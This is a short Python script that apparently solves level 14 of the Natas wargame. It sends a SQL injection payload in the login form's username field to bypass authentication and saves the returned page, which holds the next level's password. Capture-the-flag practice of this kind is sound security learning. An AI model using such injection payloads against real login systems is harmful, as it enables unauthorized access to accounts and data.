import requests

import utils

LEVEL = 14


def get_password_response(url, auth):
    sql_injection = '" or "1"="1" ##'
    params = {
        'username': sql_injection,
        'submit': 'Login'
    }
    r = requests.get(url, auth=auth, params=params)

    return r.text


def main():
    username, password, url, auth = utils.get_natas_credentials(LEVEL)
    utils.save_file('out.txt', get_password_response(url, auth))


if __name__ == "__main__":
    main()
